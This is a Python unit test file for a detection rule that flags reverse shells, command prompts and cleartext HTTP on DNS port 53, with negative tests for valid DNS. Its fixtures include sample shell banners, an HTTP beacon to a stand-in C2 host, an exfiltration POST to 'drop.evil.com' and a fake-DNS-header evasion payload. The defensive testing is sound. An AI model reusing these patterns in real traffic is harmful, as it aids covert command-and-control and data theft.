"""
Unit tests for NonDnsTrafficOnDnsPortRule (Rule 20).

Verifies detection of non-DNS protocols, reverse shells, interactive command prompts,
and cleartext HTTP on DNS port 53, while ensuring zero false positives on valid DNS.
"""

import os
import sys
import time
import unittest

PROJECT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if PROJECT_DIR not in sys.path:
    sys.path.insert(0, PROJECT_DIR)

from engine.rules import NonDnsTrafficOnDnsPortRule
from scapy.all import DNS, DNSQR, DNSRR


class TestNonDnsTrafficOnDnsPortRule(unittest.TestCase):

    def setUp(self):
        self.rule = NonDnsTrafficOnDnsPortRule(cooldown=60.0)

    # -------------------------------------------------------------------------
    # Positive Detection Tests
    # -------------------------------------------------------------------------

    def test_detects_windows_cmd_prompt_on_tcp_dns(self):
        """Detects Windows cmd.exe shell banner originating from port 53 (as in ws_dns_remoteshell.pcap)."""
        payload = b"Microsoft Windows XP [Version 5.1.2600]\r\n(C) Copyright 1985-2001 Microsoft Corp.\r\n\r\nC:\\>"
        record = {
            "type": "IP",
            "protocol": "TCP",
            "src_ip": "192.168.1.2",
            "dst_ip": "192.168.1.3",
            "src_port": 53,
            "dst_port": 1396,
            "payload": payload,
            "timestamp": 1000.0,
        }
        alert = self.rule.check(record)
        self.assertIsNotNone(alert)
        self.assertEqual(alert["rule_name"], "NON_DNS_TRAFFIC_ON_DNS_PORT")
        self.assertEqual(alert["evidence"]["anomaly_type"], "INTERACTIVE_SHELL")
        self.assertEqual(alert["severity"], "high")
        self.assertEqual(alert["confidence"], "high")
        self.assertIn("Microsoft Windows", alert["detail"])

    def test_detects_shell_commands_to_dns_port(self):
        """Detects shell commands like 'dir' or '/bin/sh' sent to destination port 53."""
        payload = b"dir\r\n"
        record = {
            "type": "IP",
            "protocol": "TCP",
            "src_ip": "192.168.1.3",
            "dst_ip": "192.168.1.2",
            "src_port": 1396,
            "dst_port": 53,
            "payload": payload,
            "timestamp": 1000.0,
        }
        alert = self.rule.check(record)
        self.assertIsNotNone(alert)
        self.assertEqual(alert["evidence"]["anomaly_type"], "INTERACTIVE_SHELL")
        self.assertEqual(alert["src_ip"], "192.168.1.3")

    def test_detects_unix_reverse_shell_banner(self):
        """Detects Unix/Linux reverse shell tokens (/bin/sh, root@kali)."""
        payload = b"root@victim:/# whoami\nroot\n"
        record = {
            "type": "IP",
            "protocol": "TCP",
            "src_ip": "10.0.0.50",
            "dst_ip": "198.51.100.20",
            "src_port": 54321,
            "dst_port": 53,
            "payload": payload,
            "timestamp": 2000.0,
        }
        alert = self.rule.check(record)
        self.assertIsNotNone(alert)
        self.assertEqual(alert["evidence"]["anomaly_type"], "INTERACTIVE_SHELL")

    def test_detects_cleartext_http_get_on_port_53(self):
        """Detects HTTP GET request targeting DNS port 53."""
        payload = b"GET /c2_beacon?id=42 HTTP/1.1\r\nHost: c2.badactor.org\r\nUser-Agent: curl/7.68.0\r\n\r\n"
        record = {
            "type": "IP",
            "protocol": "TCP",
            "src_ip": "10.0.0.15",
            "dst_ip": "203.0.113.88",
            "src_port": 49152,
            "dst_port": 53,
            "payload": payload,
            "timestamp": 3000.0,
        }
        alert = self.rule.check(record)
        self.assertIsNotNone(alert)
        self.assertEqual(alert["evidence"]["anomaly_type"], "CLEARTEXT_HTTP")
        self.assertEqual(alert["evidence"]["matched_signature"], "GET")
        self.assertEqual(alert["severity"], "medium")

    def test_detects_cleartext_http_post_on_port_53(self):
        """Detects HTTP POST request targeting DNS port 53."""
        payload = b"POST /api/exfil HTTP/1.1\r\nHost: drop.evil.com\r\nContent-Length: 12\r\n\r\nsecret_data"
        record = {
            "type": "IP",
            "protocol": "TCP",
            "src_ip": "10.0.0.15",
            "dst_ip": "203.0.113.88",
            "src_port": 49152,
            "dst_port": 53,
            "payload": payload,
            "timestamp": 3000.0,
        }
        alert = self.rule.check(record)
        self.assertIsNotNone(alert)
        self.assertEqual(alert["evidence"]["anomaly_type"], "CLEARTEXT_HTTP")

    def test_detects_non_dns_ascii_stream(self):
        """Detects high-ratio printable ASCII text on port 53 that fails DNS parsing."""
        payload = b"CUSTOM_PROTOCOL_COMMAND:STATUS_QUERY_SYS_INFO_VERSION_2\n"
        record = {
            "type": "IP",
            "protocol": "TCP",
            "src_ip": "10.0.0.22",
            "dst_ip": "198.51.100.99",
            "src_port": 53,
            "dst_port": 49200,
            "payload": payload,
            "timestamp": 4000.0,
        }
        alert = self.rule.check(record)
        self.assertIsNotNone(alert)
        self.assertEqual(alert["evidence"]["anomaly_type"], "NON_DNS_PROTOCOL")

    # -------------------------------------------------------------------------
    # Negative Tests (Legitimate DNS & Protocol Controls)
    # -------------------------------------------------------------------------

    def test_ignores_valid_udp_dns_query(self):
        """Standard valid UDP DNS query does not trigger alert."""
        dns_bytes = bytes(DNS(rd=1, qd=DNSQR(qname="google.com", qtype="A")))
        record = {
            "type": "IP",
            "protocol": "UDP",
            "src_ip": "192.168.1.5",
            "dst_ip": "8.8.8.8",
            "src_port": 53123,
            "dst_port": 53,
            "payload": dns_bytes,
            "timestamp": 5000.0,
        }
        self.assertIsNone(self.rule.check(record))

    def test_ignores_valid_tcp_dns_query(self):
        """Standard valid TCP DNS query (with 2-byte length header) does not trigger alert."""
        dns_body = bytes(DNS(rd=1, qd=DNSQR(qname="example.org", qtype="A")))
        tcp_dns_bytes = len(dns_body).to_bytes(2, "big") + dns_body
        record = {
            "type": "IP",
            "protocol": "TCP",
            "src_ip": "192.168.1.5",
            "dst_ip": "1.1.1.1",
            "src_port": 54000,
            "dst_port": 53,
            "payload": tcp_dns_bytes,
            "timestamp": 5010.0,
        }
        self.assertIsNone(self.rule.check(record))

    def test_ignores_valid_tcp_dns_response(self):
        """Standard valid TCP DNS response with answers does not trigger alert."""
        dns_resp = bytes(DNS(qr=1, aa=1, qd=DNSQR(qname="example.org"), an=DNSRR(rrname="example.org", rdata="93.184.216.34")))
        tcp_resp_bytes = len(dns_resp).to_bytes(2, "big") + dns_resp
        record = {
            "type": "IP",
            "protocol": "TCP",
            "src_ip": "1.1.1.1",
            "dst_ip": "192.168.1.5",
            "src_port": 53,
            "dst_port": 54000,
            "payload": tcp_resp_bytes,
            "timestamp": 5011.0,
        }
        self.assertIsNone(self.rule.check(record))

    def test_ignores_empty_payload_tcp_control_packets(self):
        """SYN, ACK, FIN packets with empty payload are ignored."""
        record = {
            "type": "IP",
            "protocol": "TCP",
            "src_ip": "192.168.1.5",
            "dst_ip": "8.8.8.8",
            "src_port": 54000,
            "dst_port": 53,
            "payload": b"",
            "timestamp": 5020.0,
        }
        self.assertIsNone(self.rule.check(record))

    def test_ignores_traffic_on_non_dns_ports(self):
        """Traffic on ports other than 53 is ignored by this rule."""
        record = {
            "type": "IP",
            "protocol": "TCP",
            "src_ip": "10.0.0.5",
            "dst_ip": "10.0.0.6",
            "src_port": 80,
            "dst_port": 49152,
            "payload": b"GET / HTTP/1.1\r\n\r\n",
            "timestamp": 5030.0,
        }
        self.assertIsNone(self.rule.check(record))

    def test_ignores_dot_tls_handshake_on_port_53(self):
        """DNS over TLS (DoT) ClientHello starting with TLS header is ignored."""
        tls_hello = b"\x16\x03\x01\x00\x50" + b"\x01" + b"\x00" * 74
        record = {
            "type": "IP",
            "protocol": "TCP",
            "src_ip": "192.168.1.5",
            "dst_ip": "8.8.8.8",
            "src_port": 54000,
            "dst_port": 53,
            "payload": tls_hello,
            "timestamp": 5040.0,
        }
        self.assertIsNone(self.rule.check(record))

    # -------------------------------------------------------------------------
    # Cooldown & State Pruning
    # -------------------------------------------------------------------------

    def test_cooldown_suppresses_duplicate_alerts(self):
        """Repeated non-DNS packets within cooldown window generate only 1 alert."""
        payload = b"Microsoft Windows XP [Version 5.1.2600]"
        record1 = {
            "type": "IP",
            "protocol": "TCP",
            "src_ip": "192.168.1.2",
            "dst_ip": "192.168.1.3",
            "src_port": 53,
            "dst_port": 1396,
            "payload": payload,
            "timestamp": 6000.0,
        }
        record2 = {
            "type": "IP",
            "protocol": "TCP",
            "src_ip": "192.168.1.3",
            "dst_ip": "192.168.1.2",
            "src_port": 1396,
            "dst_port": 53,
            "payload": b"dir\r\n",
            "timestamp": 6010.0,  # 10s later, within 60s cooldown
        }
        record3 = {
            "type": "IP",
            "protocol": "TCP",
            "src_ip": "192.168.1.2",
            "dst_ip": "192.168.1.3",
            "src_port": 53,
            "dst_port": 1396,
            "payload": payload,
            "timestamp": 6075.0,  # 75s later, cooldown expired
        }
        alert1 = self.rule.check(record1)
        alert2 = self.rule.check(record2)
        alert3 = self.rule.check(record3)
        self.assertIsNotNone(alert1)
        self.assertIsNone(alert2)
        self.assertIsNotNone(alert3)

    def test_prune_stale_cleans_expired_state(self):
        """prune_stale() properly removes records older than cooldown."""
        payload = b"GET / HTTP/1.1\r\n\r\n"
        record = {
            "type": "IP",
            "protocol": "TCP",
            "src_ip": "10.0.0.1",
            "dst_ip": "10.0.0.2",
            "src_port": 53,
            "dst_port": 1000,
            "payload": payload,
            "timestamp": 7000.0,
        }
        self.assertIsNotNone(self.rule.check(record))
        self.assertEqual(len(self.rule._seen), 1)

        self.rule.prune_stale(now=7030.0)  # within 60s
        self.assertEqual(len(self.rule._seen), 1)

        self.rule.prune_stale(now=7065.0)  # >60s
        self.assertEqual(len(self.rule._seen), 0)

    def test_dns_header_prefixing_evasion_detected(self):
        """Verifies that an attacker prepending a fake DNS header before a shell payload is detected (EV-01)."""
        rule_udp = NonDnsTrafficOnDnsPortRule()
        dns_hdr_udp = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        shell_payload = b"root@kali:~# whoami\n"
        rec_udp = {
            "type": "IP", "protocol": "UDP", "src_ip": "10.0.0.5", "dst_ip": "10.0.0.1",
            "src_port": 53, "dst_port": 54321, "payload": dns_hdr_udp + shell_payload, "timestamp": 100.0,
        }
        alert_udp = rule_udp.check(rec_udp)
        self.assertIsNotNone(alert_udp, "UDP shell with fake DNS header must be detected")
        self.assertEqual(alert_udp["evidence"]["anomaly_type"], "INTERACTIVE_SHELL")

        rule_tcp = NonDnsTrafficOnDnsPortRule()
        dns_hdr_tcp = b"\x00\x25\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        rec_tcp = {
            "type": "IP", "protocol": "TCP", "src_ip": "10.0.0.5", "dst_ip": "10.0.0.1",
            "src_port": 53, "dst_port": 54321, "payload": dns_hdr_tcp + shell_payload, "timestamp": 100.0,
        }
        alert_tcp = rule_tcp.check(rec_tcp)
        self.assertIsNotNone(alert_tcp, "TCP shell with fake DNS header must be detected")
        self.assertEqual(alert_tcp["evidence"]["anomaly_type"], "INTERACTIVE_SHELL")


if __name__ == "__main__":
    unittest.main()
